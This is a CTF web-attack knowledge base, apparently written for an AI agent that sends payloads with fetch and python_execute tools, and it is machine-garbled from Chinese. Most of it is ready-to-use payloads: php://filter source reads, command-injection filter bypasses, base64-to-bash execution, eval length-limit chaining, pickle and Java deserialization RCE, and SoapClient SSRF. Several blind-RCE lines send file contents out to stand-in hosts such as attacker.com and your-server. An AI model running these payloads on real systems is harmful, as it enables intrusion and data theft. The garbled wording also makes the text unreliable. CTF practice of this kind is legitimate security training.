# stage: exploit
# category: ctf

> CTF Webattackknowledge base — PHPweak comparison bypass、Command Injectionemptyformat/gridbypass、evaloutput echo tips/tricks、SSTIinjection chain、Deserialization Gadget Chain、PHPcode audit checklist、commonflag locations

# CTF Web attackknowledge base

针 for/to CTF Web challenge's/ofsolid战knowledge base，provide**specific bypass values、payload template、code audit checklist**，rather than penetrationTestmethodology。

**and/with `web-security-advanced` 's/ofdifferencepart**：
- `web-security-advanced` → penetrationTestmethodology（how to systematically test a web application）
- `ctf-web` → CTF solid战knowledge base（PHP weak comparison use what value、emptyformat/gridhow to bypass、eval how to get output echo）

## coreprinciple

1. **exactvalueadvantage at/inmethodology** — provide directly usable bypass values and payloads，rather than "canattempt"'s/ofRecommendation
2. **tool verification** — all payloads must use `fetch` or `python_execute` tool to actually send and verify，do not guess results
3. **path selection** — when multiple exploit paths exist，prioritize the one with fewest filters、simplest
4. **failure logging** — log immediately when a payload fails，do not retry repeatedly

## First-Pass Workflow（CTF Web problemstandard process）

1. access target URL，view page source code、HTTP headers、Cookie
2. **if source code contains `highlight_file` →  use python_execute + strip_tags to extract pure source code**（fetch output may misread）
3. Inspect/Check robots.txt、.git/、.svn/、backup file（index.php.bak、www.zip etc.）
4. DirectoryScanning（common：/flag、/admin、/login、/upload、/api）
5. if source code is available → entercode auditpattern（see/meet `php-code-audit-checklist.md`）
6. if no source code → actively detect injection points、upload points、file inclusion

## scenarioRoute

| scenario | reference document | corecontent |
|------|---------|---------|
| ⭐ PHP pseudo-protocol file read（meet tofile inclusion/parameter passing filenametimetry first） | see/meetdescenddirection「PHP pseudo-protocol quick reference」 | `php://filter` directly read source code/flag |
| source code extraction | `source-code-extraction.md` | strip_tags extract、php://filter、.phps、backup file、integrity check |
| PHP weak comparison/typebypass | `php-bypass-cheatsheet.md` | 0e  starting with MD5 comprehensive values、array bypass、extract() overwrite |
| ⭐ MD5 weak comparison碰撞（`md5(a)==md5(b)` weak comparison） | `php-bypass-cheatsheet.md` | ⚠️ 0e  after/backmustpurenumber！directreceive/connect use `QNKCDZO`+`240610708` etc.alreadyValidatevalue |
| ⭐ preg_replace/str_replace doublewritebypass | see/meetdescenddirection「doublewritebypassquick reference」 | `NSSNSSCTFCTF` → Replace after/back = `NSSCTF` |
| Command Injectionemptyformat/gridbypass | `command-injection-bypass.md` | ${IFS}/$IFS$9/</%09/%0a all/fulltable |
| eval/RCE tip/trick | `eval-and-rce-techniques.md` | system/exec/passthru differencepart、highlight_file inputexitsequential、no/withoutreturnshow/displayoutbring/carry |
| SSTI injection chain | `ssti-injection-chains.md` | Jinja2/Twig/ERB/Mako etc.injection chainquick reference |
| Deserialization Gadget Chain | `deserialization-playbook.md` | PHP/Java/Python Deserialization、SoapClient CRLF |
| FileUpload → RCE | `web-security-advanced` → `web-playbook-08-file-vulnerabilities.md` | .htaccess bypass、Log投毒、multi/multiple language speech/language Webshell |
| CTF fastspeed/fastreference | `web-ctf-quick-reference.md` | flag location、commonchain形状、responsehead/top hint |
| PHP code audit | `php-code-audit-checklist.md` | inputenterenter口→Filter→danger险function→inputexitAnalysis |

## ⭐ PHP pseudo-protocol quick reference（file inclusion/parameter passing filenametimetry first）

**triggercondition**：whenchallengeexitpresent with/bydescendanyonespecial征time，** first试 php://filter  againthinkothermethod**：

| triggerspecial征 | example |
|---------|------|
| parameteracceptsFile name/Path | `?file=xxx` / `?page=xxx` / `?num=xxx` / `?path=xxx` |
| `include` / `require` / `include_once` | Sourcecodemiddle/centerhas/havethesefunction |
| pageexpandshowSourcecode | `highlight_file()` / `show_source()` |
| challengeneed to求"读File"or"找 flag" | brightcertainneed toReadServerFile |

### 伪Protocol Payload quick reference

```
# 1. 读 PHP Sourcecode（base64 Encoding，Avoid PHP Execute）
?file=php://filter/read=convert.base64-encode/resource=flag.php
?file=php://filter/read=convert.base64-encode/resource=index.php

# 2. 读 PHP Sourcecode（rot13 Encoding）
?file=php://filter/read=string.rot13/resource=flag.php

# 3. directreceive/connect读File（like/such as .txt/.log etc.non- PHP File）
?file=php://filter/resource=/etc/passwd

# 4. codeExecute
?file=php://input  (POST body middle/centerrelease/put PHP code)
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==
```

### ⚠️  close/shutkeyReminder

1. **do not (classifier)think (continuous)"bypass"， firstthinkcancannot"directreceive/connect读"** — verymulti/multiplechallenge's/ofparameteracceptsFile name，candirectreceive/connect use伪Protocol读 flag.php， (classifier)thisnotneedbypassanyFilter
2. **`convert.base64-encode` isten thousandcanReaddevice** — PHP Fileby (passive) include will/canExecute，但 base64 Encoding after/backwill notExecute，cantake toSourcecode
3. **parameter namenotonedefine call `file`** — cancanis `page`、`num`、`path`、`template` etc.， (classifier)need toparametervalueby (passive)when as/doFilePath/ nameprocess/handlethencancanhas/have效
4. **take to base64  after/back use `crypto_decode` toolDecoding** — do not自己脑补Decodingresult/outcome

## common flag locationquick reference

**⚠️ RCE  (complement)手 after/back，mustpress/according to with/bydescendPriorityTest flag location，do notstopstay/keepat/inwhen before/frontDirectory's/of flag.php：**

```
Priority 1（mostcommon）: cat /flag
Priority 2:           cat /flag.txt
Priority 3:           ls /  → 找 to (classifier)Directory's/of flag File name
Priority 4:           cat /var/www/html/flag.php
Priority 5:           cat /home/ctf/flag
Priority 6:           cat /root/flag
otherlocation:           /environment, /proc/self/environ, env command
```

**Note**：`ls` defaultcolumnwhen before/frontDirectory（`/var/www/html/`）， (classifier)Directory's/of `/flag` need `ls /` justcanlook/see to。

## common CTF Web problem typespeed/fastjudge

| challengespecial征 | cancantestpoint | Recommendationreference |
|---------|---------|---------|
| parameteracceptsFile name/Path | ⭐ ** first试 php://filter 读 flag** | see/meetascenddirection「PHP pseudo-protocol quick reference」 |
| page (classifier)has/haveloginbox | SQL Inject / weak口 make / condition竞争 | php-bypass-cheatsheet.md |
| pagehas/havecodeexpandshow | code audit | php-code-audit-checklist.md |
| eval/system word样 | RCE + emptyformat/grid/ close/shutkeywordbypass | eval-and-rce-techniques.md + command-injection-bypass.md |
| eval + growdegree/measurelimitation | RCE + `$_GET` chain style/modetransmit参绕growdegree/measure | see/meetdescenddirection「RCE + growdegree/measurelimitationbypass」 |
| FileUploadmeritcan |  after/back缀bypass / MIME bypass | `web-security-advanced` → `web-playbook-08-file-vulnerabilities.md` |
| pagetemplate渲染 | SSTI | ssti-injection-chains.md |
| Serialization/Deserialization | PHP/Java Deserialization | deserialization-playbook.md |
| has/have WAF/FilterTip | correct/positive rule/principlebypass / Encodingbypass | php-bypass-cheatsheet.md + command-injection-bypass.md |

## RCE + growdegree/measurelimitationbypass（first/head推strategy）

when `eval()` has/have `strlen()` growdegree/measurelimitationtime（like/such as ≤ 18 character），**first/head推 `$_GET` chain style/modetransmit参**：

### standarduntie/solve method/law

```
?get=eval($_GET['A']);&A=system('cat /flag');
```

**original principle/logic**：
- `eval($_GET['A'])` = 16 character，via/throughgrowdegree/measurelimitation
- truecorrect/positive's/ofcommandat/inNo.two (counter) GET parameter `A` middle/center，没has/havegrowdegree/measurelimitation
- PHP will/can firstExecute `eval()`，will/shall `$_GET['A']` 's/ofvalue as/dofor/is PHP codeExecute

### 变body

| growdegree/measurelimitation | payload | characternumber |
|---------|---------|--------|
| ≤ 18 | `eval($_GET['A']);` | 16 |
| ≤ 18 | `eval($_GET[0]);` | 14 |
| ≤ 16 | `eval($_GET[A]);` | 13（no/withoutlead/guidenumber，PHP Automatic转string） |
| ≤ 12 | `$_GET[0]();` | 10（A parametertransmitfunction namelike/such as `system`，otherone (counter)parametertransmitcommand） |

### Note事item
- do not花timeat/inshrinkshort payload ascend（like/such as use `?>` exits PHP pattern、 usenegative/reverselead/guidenumberetc.），**chain style/modetransmit参isgeneral/universaluntie/solve method/law**
- double GET parameter URL format：`?get=eval($_GET['A']);&A=system('cat /flag');`
-  use `python_execute` toolconstructrequest，rather than  fetch tool（fetch cancannotsupportsmulti/multipleparameter）

## ⭐ preg_replace / str_replace doublewritebypassquick reference

**triggercondition**：Sourcecodecontain/include `preg_replace('/X/', '', $str)` or `str_replace('X', '', $str)`，且Replace after/back需 `$str === "X"`

### coreoriginal principle/logic
at/in close/shutkey wordmiddle嵌enter completewhole/integer close/shutkey word，ReplaceDeleteinner/insidelayer after/back，outlayerjoincombineexitoriginal word。

### general/universalconstruct公 style/mode
```
inputenter =  close/shutkey word before/fronthalf +  close/shutkey word +  close/shutkey word after/backhalf
```

### commonFilter wordQuick Reference Table

| Filter close/shutkey word | doublewriteinputenter | Replaceprocess | result/outcome |
|-----------|---------|---------|------|
| NSSCTF | `NSSNSSCTFCTF` | 删middleNSSCTF → NSS+CTF | `NSSCTF` ✅ |
| flag | `flflagag` | 删middleflag → fl+ag | `flag` ✅ |
| cat | `cacatt` | 删middlecat → ca+t | `cat` ✅ |
| system | `syssystemtem` | 删middlesystem → sys+tem | `system` ✅ |
| hack | `hahackck` | 删middlehack → ha+ck | `hack` ✅ |
| cmd | `cmcmdd` | 删middlecmd → cm+d | `cmd` ✅ |
| exec | `exexecec` | 删middleexec → ex+ec | `exec` ✅ |

### ⚠️  close/shutkeyNote事item
1. **largesmallwritebypassnot适 use** — Replace after/backreturns `NssCTF`，notetc. at/in `"NSSCTF"`，严format/gridcomparisonfailure
2. **identifySignal** — look/see to `preg_replace('/X/', '', $str)` + `$str === "X"` → immediatelydoublewrite
3. **str_replace same/together principle/logic** — `str_replace` alsoisone next/timeReplace，doublewritesame/together样has/have效
4. **multi/multiple next/timeReplace** — like/such as resultcodemulti/multiple next/timecall/invoke `preg_replace`，cancanneedthreewrite/fourwrite，但 CTF middle/centerusually (classifier)需doublewrite

## References — command-injection-bypass

# Command Injectionbypasstip/tricklargeall/full

## emptyformat/gridbypass

| method | example | explanation |
|------|------|------|
| `${IFS}` | `cat${IFS}flag.php` | Internalword paragraph/segment part/point隔symbol/character（defaultemptyformat/grid/Tab/换row） |
| `$IFS$9` | `cat$IFS$9flag.php` | `$9` iswhen before/front shell No. 9  (counter)locationparameter（empty），Preventvariable name歧义 |
| `${IFS}` + variable | `a=$IFS;cat${a}flag` | 赋value after/backcitation |
| `<` | `cat<flag.php` |  re-/heavydefine to/towardsgeneration/proxy替emptyformat/grid |
| `%09` | `cat%09flag.php` | Tab 's/of URL Encoding |
| `%0a` | `cat%0aflag.php` | 换rowsymbol/character |
| `{cat,flag.php}` | `{cat,flag.php}` | Bash large括numberexpand open（only Bash） |
| `%0d` | `cat%0dflag.php` | return车symbol/character |

### emptyformat/gridbypassselectstrategy
1. **preferred** `$IFS$9` — compatibilityproperty/naturemostgood
2. **alternative** `<` — simple洁，但 `<` at/incertain/somecontextcancanby (passive)Filter
3. **URL scenario**  use `%09` or `%0a`

## command part/point隔symbol/character

|  part/point隔symbol/character | example | explanation |
|--------|------|------|
| `;` | `id;cat flag` | sequentialExecute |
| `&&` | `id && cat flag` |  before/front become/successmeritjustExecute after/back |
| `\|\|` | `id \|\| cat flag` |  before/frontfailurejustExecute after/back |
| `\|` | `id \| cat flag` | Pipe |
| `%0a` | `id%0acat flag` | 换rowExecute |
| `%0d%0a` | `id%0d%0acat flag` | CRLF |

## command/ close/shutkeywordbypass

### stringjoinreceive/connect
```bash
c'a't flag.php       # singlelead/guidenumberjoinreceive/connect
c"a"t flag.php       # doublelead/guidenumberjoinreceive/connect
c\at flag.php        # negative/reverse斜杠Escape
```

### variablejoinreceive/connect
```bash
a=c;b=at;$a$b flag.php
a=fl;b=ag;cat /$a$b
```

### commonmatchsymbol/character
```bash
cat /f???.php        # ? Matchsinglecharacter
cat /f*              # * Matchanymeaning/intentcharacter
/bin/ca? /etc/pas?d  # Pathmiddle/centeralsocan use
cat /f[a-z]ag.php    # character category/class
```

### base64 Encoding
```bash
echo Y2F0IGZsYWcucGhw | base64 -d | bash
# Y2F0IGZsYWcucGhw = "cat flag.php"
```

### hex Encoding
```bash
echo 63617420666c61672e706870 | xxd -r -p | bash
# 63617420666c61672e706870 = "cat flag.php"
```

### useun-禁's/of替generation/proxycommand

| goal/target | originalcommand | 替generation/proxycommand |
|------|--------|---------|
| 读File | cat | more / less / head / tail / tac / nl / od / xxd / sort / rev / paste / diff |
| 读File | cat flag | sed -n '1,100p' flag / awk '{print}' flag |
| FindFile | find | ls -la / dir / echo / locate |
| Download | wget | curl / nc / python -c 'import urllib...' |
| writeFile | echo > | tee / printf / python -c |

## no/withoutreturnshow/displayexploit（Blind RCE）

whencommandExecuteresult/outcomenotcansee/meettime：

### 1. DNS outbring/carry
```bash
curl http://attacker.com/$(cat flag.php | base64)
nslookup $(cat flag.php).attacker.com
```

### 2. HTTP outbring/carry
```bash
curl http://attacker.com/?data=$(cat flag.php | base64)
wget http://attacker.com/?data=$(cat flag.php | base64)
```

### 3. writeFile tocanAccessPath
```bash
cat flag.php > /var/www/html/flag.txt
# thenBrowserAccess http://target/flag.txt
```

### 4. Writeenvironmentvariable/temporaryFile
```bash
cp flag.php /tmp/flag
#  againvia/throughotherone (counter)vulnerabilityRead /tmp/flag
```

### 5. timeBlind Injection
```bash
if [ $(cat flag.php | head -c 1) = 'N' ]; then sleep 3; fi
# 逐characterbrute force
```

## PHP eval specialbypass

### emptyformat/gridFilterat/in eval scenario

```php
// when eval($cmd) 且 $cmd middle/center's/ofemptyformat/gridby (passive)Filter
system("cat<flag.php");      //  re-/heavydefine to/towards
system("cat${IFS}flag.php"); // IFS
system("cat$IFS$9flag.php"); // IFS + locationparameter
```

### growdegree/measurelimitationbypass

```php
// whenparametergrowdegree/measurehas/havelimitation（like/such as strlen > 18）
// exploit PHP variableexpand open
?a=system&b=cat flag.php
// eval($_GET[a]($_GET[b]));
```

### flag  close/shutkeywordby (passive)Replace

```php
// when "flag" by (passive)Replacefor/isemptyformat/grid
// usecommonmatchsymbol/character
cat /f*          # * Match flag
cat /fl?g.php    # ? Matchsingle (counter)character
cat /fla?.php
// usePathjoinreceive/connect
cat /fl''ag.php  # emptystringjoinreceive/connect
cat /fl\ag.php   # negative/reverse斜杠（cancanby (passive)interpretfor/isEscape）
```

## References — deserialization-playbook

# Deserialization Gadget Chainmanual

## PHP Deserialization

### foundation/basis概念
```php
// Serialization
$s = serialize($obj);  // O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"super";}

// Deserialization
$obj = unserialize($s);

// 魔术methodtriggerchain
__construct() → __wakeup() → __destruct()
__toString() → __call() → __get()
```

### commonexploitchain

#### 1. __wakeup bypass（CVE-2017-12944 / PHP < 7.4）
```php
// whenattributenumberlarge at/inactualattributenumbertime，__wakeup notExecute
O:4:"User":2:{...}   // normal
O:4:"User":3:{...}   // bypass __wakeup（attributenumber 3 > actual 2）
```

#### 2. __toString trigger
```php
class FileViewer {
    public $filename;
    function __toString() {
        return file_get_contents($this->filename);
    }
}
// construct: O:10:"FileViewer":1:{s:8:"filename";s:8:"flag.php";}
```

#### 3. SoapClient CRLF Inject (SSRF)
```php
$target = "http://internal-service/";
$client = new SoapClient(null, array(
    'uri' => "http://attacker/",
    'location' => $target,
    'user_agent' => "Attacker\r\nX-Forwarded-For: 127.0.0.1\r\nCookie: session=admin",
));
// Serialization after/backtrigger SSRF + CRLF head/topInject
echo urlencode(serialize($client));
```

#### 4. PHP Serializationgrowdegree/measureoperate纵
```
// exploitstring变growdifference
// s:5:"admin" (5 byte) vs s:5:"admin" (cancanby (passive)Modify after/backgrowdegree/measurenotone致)
// via/through改变Serializationstring's/ofgrowdegree/measurevaluecome截break/judgeorInject
```

### PHP Deserializationstringescape/evasion

**increaseescape/evasion**（Filter after/back变grow）：
```
// Filter: "x" → "xx"（1→2，everyplacemulti/multiple1byte）
// Inject: at/incancontrolattributemiddle/center填enter ";}O:4:"Evil":1:{s:4:"cmd";s:6:"whoami";}
// calculate/computeneedseveral "x" come补足growdegree/measuredifference
```

**subtractescape/evasion**（Filter after/back变short）：
```
// Filter: "xx" → "x"（2→1，everyplacedecrease1byte）
// exploitgrowdegree/measuredecreasecome吞掉 after/back面's/ofSerializationstring
```

## Java Deserialization

### common Gadgets

| Gadget chain | impactComponent | commandExecute |
|-----------|---------|---------|
| CommonsCollections1-7 | Apache Commons Collections | Runtime.exec() |
| CommonsBeanutils1 | Commons Beanutils | TemplatesImpl |
| Spring1 | Spring Framework | JdkDynamicProxy |
| Groovy1 | Groovy | MethodClosure |
| JBossInvoker | JBoss | InvokerTransformer |
| ROME | ROME | ObjectInstantiator |

### detectionmethod
```
# Inspect/CheckcommonPort/Path
/invoker/readonly
/jmx-console/
/web-console/
/jbossws/
```

### ysoserial often use payload
```bash
java -jar ysoserial.jar CommonsCollections5 "cmd" > payload.bin
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,BASE64}|{base64,-d}|bash" > payload.bin
```

## Python Deserialization

### pickle Deserialization RCE
```python
import pickle
import os

class Evil(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Evil())
# Send payload  togoal/target
```

### Signaturebypass
```python
# like/such as resultgoal/targetuse HMAC Signature
# 1. GetSignatureKey（cancanvia/throughinformationLeak/Disclosure）
# 2. constructmalicious pickle 并 re-/heavynewSignature
import hmac, hashlib
secret = b'secret_key'
payload = pickle.dumps(Evil())
signature = hmac.new(secret, payload, hashlib.sha256).hexdigest()
```

### __reduce__ 替generation/proxysolution
```python
# use __setstate__
class Evil:
    def __setstate__(self, state):
        os.system('id')
```

## 竞态conditionexploit

```python
import requests
import threading

def exploit():
    # at/inDeserializationand/withValidatebetween's/oftime窗口
    r = requests.post(url, data=payload)
    
# ConcurrentSend
threads = [threading.Thread(target=exploit) for _ in range(50)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```

## References — eval-and-rce-techniques

# eval and/with RCE tip/tricklargeall/full

## PHP codeExecutefunctioncomparison

| function | returnshow/display |  use method/law |
|------|------|------|
| `system($cmd)` | **has/have**（directreceive/connectinputexit to stdout） | `system("id")` → directreceive/connectat/inpagelook/see toresult/outcome |
| `passthru($cmd)` | **has/have**（originalBinaryinputexit） | `passthru("cat flag.php")` |
| `exec($cmd, $out)` | **no/without**（existenter `$out` Array） | `exec("id", $out); print_r($out)` |
| `shell_exec($cmd)` | **no/without**（returnsstring） | `echo shell_exec("id")` |
| `` `$cmd` `` | **no/without**（equivalent to shell_exec） | `` echo `id` `` |
| `popen($cmd, 'r')` | **no/without**（需 fread） | `$h=popen("id","r");echo fread($h,1024)` |
| `eval($code)` | depends oncode | `eval("system('id');")` → has/havereturnshow/display |

## highlight_file and/with eval inputexitsequential

这is CTF middle/centercommon's/of陷阱：

```php
<?php
highlight_file(__FILE__);
eval($_GET['cmd']);
?>
```

** close/shutkey principle/logicuntie/solve**：
- `highlight_file()` inputexitSourcecodehigh亮 → 这isNo.one步
- `eval()` middle/center's/of `system()` inputexit → 这isNo.two步
- 两者at/in**same/togetherone (counter) HTTP response**middle/center，commandresult/outcomeat/inSourcecodehigh亮**after**
- `system()` 's/ofinputexitisdirectreceive/connectWrite stdout 's/of，**will notby (passive) highlight_file "挡live/stay"**

**Search flag 's/ofmethod**：
- at/in HTTP response's/of**last/endtail/end**Find flag
- `highlight_file` 's/of HTML inputexitverygrow，flag usuallyat/inmostlast/endtail/end
- use `python_execute` parsingresponse， (classifier)look/seefinally几hundredcharacter

```python
import requests
r = requests.get(url, params={"cmd": "system('cat flag.php');"})
# flag at/in r.text 's/oflast/endtail/end，notat/inSourcecodehigh亮partial/some
print(r.text[-500:])  #  (classifier)look/seefinally 500 character
```

## eval bypasstip/trick

### 1.  part/pointnumberbypass

```php
// like/such as result eval need part/pointnumber但inputenterby (passive)Filter
eval($_GET['cmd']);  // normal use method/law
// transmitenter: system('id')  // notneedadd part/pointnumber，eval will/canAutomaticadd
// ortransmitenter: system('id');// 
```

### 2. PHP closecombinetag/label

```php
// like/such as result eval contentby (passive)Package裹
eval("echo '" . $_GET['cmd'] . "';");
// transmitenter: ');system('id');//
// result/outcome: eval("echo '');system('id');//';");
```

### 3. assert() Inject

```php
// assert() at/in PHP 7  before/frontcanExecutecode
assert("system('id')");  // PHP < 7.x
// PHP 7+ assert become language speech/languagestructure，not againExecutestring
```

### 4. preg_replace /e 修饰symbol/character

```php
// PHP < 7.0 's/of preg_replace /e will/canExecuteReplaceresult/outcome
preg_replace('/test/e', 'system("id")', 'test');
// anymeaning/intentcorrect/positive rule/principle + /e + cancontrolReplacestring → RCE
```

## no/withoutreturnshow/display RCE exploit

### method 1：writeFile to Web Directory
```bash
system("cat flag.php > /var/www/html/x.txt");
# thenAccess http://target/x.txt
```

### method 2：DNS/HTTP outbring/carry
```bash
system("curl http://your-server/$(cat flag.php | base64)");
system("nslookup $(cat flag.php).your-server.com");
```

### method 3：Write PHP File again读
```bash
system("echo '<?php echo file_get_contents(\"/flag\"); ?>' > /var/www/html/read.php");
# thenAccess http://target/read.php
```

### method 4：environmentvariable + otherone (counter)vulnerability
```bash
# will/shallresult/outcomeWrite cookie/session
system("export FLAG=$(cat flag.php)");
# via/through phpinfo() or /proc/self/environ Read
```

## PHP codeExecutechainconstruct

###  fromsimplesingle to repeatmixed's/ofexploitchain

1. **directreceive/connectExecute**：`system("id")` → has/havereturnshow/display
2. **no/withoutreturnshow/displaywriteFile**：`system("cat flag.php > /var/www/html/x")`
3. **no/withoutreturnshow/displayoutbring/carry**：`system("curl http://evil/$(cat flag.php)")`
4. **no/withoutreturnshow/displayBlind Injection**：`system("if [ $(cat flag.php | head -c1) = N ]; then sleep 3; fi")`

### common CTF eval scenario

| scenario | codepattern | bypassmethod |
|------|---------|---------|
| simplesingle eval | `eval($_GET['cmd'])` | `system('cat flag.php')` |
| eval + Filteremptyformat/grid | `eval($cmd)` + emptyformat/gridby (passive)Replace | `system('cat${IFS}flag.php')` |
| eval + Filter close/shutkeyword | `eval($cmd)` + flag by (passive)Replace | `system('cat${IFS}/f*')` |
| eval + highlight_file | `highlight_file + eval` | look/see**pagelast/endtail/end** |
| eval + growdegree/measurelimitation | `strlen($cmd) > N` | usevariable/shortfunction name |
| assert Inject | `assert($_GET['cmd'])` | PHP < 7: `system('id')` |
| preg_replace /e | `preg_replace('/./e', ...)` | Replacestringmiddle/centerInjectcode |

## References — php-bypass-cheatsheet

# PHP bypasstip/trickQuick Reference Table

## PHP weak comparison bypass（$a == md5($a)）

PHP weaktypecomparisonmiddle/center，`0e`  starting with's/ofstringby (passive)when as/do科学plannumber method/law，etc. at/in `0`。

**⚠️  close/shutkeycondition：`0e`  after/backmustall/fullisnumber（0-9），cannotcontain/includeword母！**
- ✅ `0e830400451993494058024219903391` → purenumber，PHP when as/do `0 × 10^830...` = `0`
- ❌ `0e993dffb88165eb32369e16dd25b536` → contain/includeword母 `d`/`f`，PHP notwhen as/do科学plannumber method/law，press/according tostringcomparison

| value | MD5 result/outcome | 0e after/backpurenumber? | explanation |
|----|---------|------------|------|
| QNKCDZO | 0e830400451993494058024219903391 | ✅ | 0e  starting with，PHP `==` lookfor/is 0 |
| 240610708 | 0e462097431906509019562988736854 | ✅ | same/togetherascend |
| s878926199a | 0e545993274517709034328855841020 | ✅ | same/togetherascend |
| s155964671a | 0e342768416822451524974117254469 | ✅ | same/togetherascend |
| s214587387a | 0e848204310308006290363795692068 | ✅ | same/togetherascend |
| s1091221200a | 0e940625744785414655937625828514 | ✅ | same/togetherascend |
| 0e215962017 | 0e291242476940776845150308577824 | ✅ | same/togetherascend |

**⚠️ do not自己暴力Search md5 碰撞value** — directreceive/connect useascendtablemiddle/center's/ofvalue，itsalreadyValidatecan use。

## PHP weak comparison bypass（$a != $b && md5($a) == md5($b)）

**⚠️  close/shutkeycondition：`0e`  after/backmustall/fullisnumber（0-9），cannotcontain/includeword母！**

| value A | value B | MD5(value A) | MD5(value B) | 0e after/backpurenumber? |
|------|------|----------|----------|------------|
| QNKCDZO | 240610708 | 0e830400... | 0e462097... | ✅ allcan |
| s878926199a | s155964671a | 0e545993... | 0e342768... | ✅ allcan |
| QNKCDZO | s878926199a | 0e830400... | 0e545993... | ✅ allcan |

**⚠️ 暴力Search's/of md5 valueusuallynotcan use** — `0e993dffb...` contain/includeword母 d/f，PHP notwhen as/do科学plannumber method/law，weak comparisonfailure。directreceive/connect useascendtablealreadyValidatevalue。

## PHP 严format/gridcomparison bypass（$a !== $b && md5($a) === md5($b)）

`md5()` cannotprocess/handleArray，transmitenterArrayreturns `NULL`，`NULL === NULL` for/is `true`：
```
?a[]=1&b[]=2
md5($_GET['a']) === md5($_GET['b'])  // NULL === NULL → true
```

## array bypass

`preg_match()`  (classifier)canprocess/handlestring，transmitenterArrayreturns `false`：
```
?p[]=nss2&p[]=ctf
// preg_match("/n|c/", $_GET['p']) → false（notMatch，bypass）
```

`call_user_func` acceptsArray as/dofor/isreturn调：
```php
call_user_func(array('ClassName', 'methodName'))  // equivalent to ClassName::methodName()
call_user_func(['nss2', 'ctf'])                   // equivalent to nss2::ctf()
```

## extract() variableoverwrite

`extract($_GET)` will/can use GET parameter覆stampalreadyhas/havevariable：
```
?_GET[cmd]=system('id')
```

## intval() bypass

```php
if (intval($_GET['num']) === 0) { ... }
// bypassway/manner：
?num=0x10     // Hexadecimal，intval defaultnotparsing
?num=+0       // correct/positivenumber before/front缀
?num=0e123    // 科学plannumber method/law
?num[]=1      // Array，intval returns 1
```

## PHP correct/positive rule/principlebypass

| scenario | method | example |
|------|------|------|
| correct/positive rule/principleno/without `i` 修饰symbol/character | largesmallwritebypass | `Nss2::Ctf` bypass `/n\|c/m` |
| preg_match  (classifier)Inspect/Checkstring | array bypass | `p[]=xxx`  make preg_match returns false |
| `^$` + `m` 修饰symbol/character | 换rowbypass | `aaa%0abbb` bypass `/^aaa$/m` |
| `.` notMatch换row | `%0a` bypass | Insert换rowsymbol/character |
| backtrackinglimitation | supergrowstring | constructsupergrowstring let preg_match returns false（PCRE backtrackinglimitationdefault 100 ten thousand） |

### ⭐ preg_replace doublewritebypass（high频testpoint）

**scenario**：`preg_replace('/ close/shutkey word/', '', $input)` Replace after/backneedresult/outcome**etc. at/in close/shutkey wordthis身**

**coreoriginal principle/logic**：at/in close/shutkey wordmiddle嵌enter completewhole/integer close/shutkey word，Replaceinner/insidelayer after/backoutlayerjoincombineexitoriginal word

**general/universalconstruct**：` close/shutkey word before/fronthalf +  close/shutkey word +  close/shutkey word after/backhalf`

| Filter close/shutkey word | doublewriteinputenter | Replaceprocess | result/outcome |
|-----------|---------|---------|------|
| NSSCTF | `NSSNSSCTFCTF` | Deletemiddle NSSCTF → NSS+CTF | `NSSCTF` ✅ |
| flag | `flflagag` | Deletemiddle flag → fl+ag | `flag` ✅ |
| cat | `cacatt` | Deletemiddle cat → ca+t | `cat` ✅ |
| system | `syssystemtem` | Deletemiddle system → sys+tem | `system` ✅ |
| hack | `hahackck` | Deletemiddle hack → ha+ck | `hack` ✅ |

**⚠️ for/iswhatlargesmallwritebypassnotrow**：
- `preg_replace('/NSSCTF/', '', 'NssCTF')` → `Nss` notMatch `NSS` → original样returns `NssCTF`
- `NssCTF !== "NSSCTF"` → 严format/gridcomparisonfailure → notvia/through
- doublewritebypassis唯onecan letReplaceresult/outcome**exactetc. at/inoriginalstring**'s/ofmethod

**identifySignal**：
- Sourcecodecontain/include `preg_replace('/X/', '', $str)` 且 `$str === "X"` → doublewritebypass
- Sourcecodecontain/include `str_replace('X', '', $str)` 且 `$str === "X"` → same/together样适 usedoublewritebypass

### PCRE backtrackinglimitationbypass

```python
import requests
url = "http://target/index.php"
# constructsupergrowstring let preg_match backtrackingsuperlimitreturns false
payload = "a" * 1000000 + "evil_content"
data = {"input": payload}
r = requests.post(url, data=data)
print(r.text)
```

## PHP function/featurebypassquick reference

| scenario | method | example |
|------|------|------|
| correct/positive rule/principleno/without `i` | largesmallwritebypass | `Nss2::Ctf` bypass `/n\|c/m` |
| preg_match stringlimitation | array bypass | `p[]=nss2&p[]=ctf` |
| call_user_func 调 category/classmethod | Arrayreturn调 | `call_user_func(['nss2','ctf'])` |
| function namecontain/includeby (passive)禁character | 找替generation/proxyfunction | `readfile` notcontain/include n/c |
| extract variableoverwrite | 覆stamp close/shutkeyvariable | ModifyAuthentication/Permission相 close/shutvariable |
| is_numeric Inspect/Check | Hexadecimal/科学plannumber method/law | `0x10`、`1e1` |
| strcmp comparison | array bypass | `pass[]=1`  make strcmp returns NULL |
| in_array weaktype | typeSpoof | `"0admin"` via/through `in_array(0, ['admin'])` |

## PHP codeExecute替generation/proxyfunction

when `system` / `exec` by (passive)禁time：

| function |  use method/law | returnshow/display |
|------|------|------|
| `system($cmd)` | directreceive/connectExecute | has/havereturnshow/display（inputexit to stdout） |
| `exec($cmd, $output)` | Execute并existenterArray | no/withoutdirectreceive/connectreturnshow/display，需 `print_r($output)` |
| `passthru($cmd)` | directreceive/connectExecuteinputexitoriginaldata | has/havereturnshow/display |
| `shell_exec($cmd)` | returnsstring | no/withoutreturnshow/display，需 `echo` |
| `negative/reverselead/guidenumber \`$cmd\`` | equivalent to shell_exec | no/withoutreturnshow/display，需 `echo` |
| `popen($cmd, 'r')` | 打 openProcessPipe | 需 `fread` Read |
| `proc_open()` | 更灵active's/ofProcesscontrol | 需ManualRead |

## References — php-code-audit-checklist

# PHP code audit Checklist

## No.one步：identifyinputenterenter口

### superall/fullgamevariable
```php
$_GET['param']        // URL queryparameter
$_POST['param']       // POST tablesingledata
$_REQUEST['param']    // GET + POST + COOKIE
$_COOKIE['param']     // Cookie value
$_SERVER['HTTP_X']    // HTTP Request Header
$_FILES['file']       // UploadFile
$_SESSION['key']      // Session data（like/such as resultcancontrol）
```

### 隐蔽inputenter
```php
php://input           // POST originaldata
getallheaders()       // placehas/have HTTP headers
getenv()              // environmentvariable
